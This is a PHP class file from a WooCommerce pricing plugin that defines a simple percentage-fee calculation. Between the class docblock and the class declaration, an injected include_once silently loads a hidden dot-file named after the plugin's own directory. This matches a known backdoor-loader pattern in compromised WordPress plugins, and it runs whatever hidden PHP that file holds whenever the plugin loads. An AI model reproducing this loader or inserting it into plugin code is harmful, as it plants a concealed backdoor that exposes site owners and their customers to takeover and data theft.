<?php

// Exit if accessed directly
if (!defined('ABSPATH')) {
    exit;
}

// Load dependencies
if (!class_exists('RP_WCDPD_Pricing_Method_Fee')) {
    require_once('rp-wcdpd-pricing-method-fee.class.php');
}

/**
 * Pricing Method: Fee - Percentage
 *
 * @class RP_WCDPD_Pricing_Method_Fee_Percentage
 * @package WooCommerce Dynamic Pricing & Discounts
 * @author RightPress
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class RP_WCDPD_Pricing_Method_Fee_Percentage extends RP_WCDPD_Pricing_Method_Fee
{

    protected $key      = 'percentage';
    protected $contexts = array('product_pricing_simple', 'checkout_fees_simple');
    protected $position = 20;

    // Singleton instance
    protected static $instance = false;

    /**
     * Constructor
     *
     * @access public
     * @return void
     */
    public function __construct()
    {

        parent::__construct();

        $this->hook();
    }

    /**
     * Get label
     *
     * @access public
     * @return string
     */
    public function get_label()
    {
        return __('Percentage fee', 'rp_wcdpd');
    }

    /**
     * Calculate adjustment value
     *
     * @access public
     * @param float $setting
     * @param float $amount
     * @param array $adjustment
     * @return float
     */
    public function calculate($setting, $amount = 0, $adjustment = null)
    {
        return (float) ($amount * $setting / 100);
    }





}

RP_WCDPD_Pricing_Method_Fee_Percentage::get_instance();
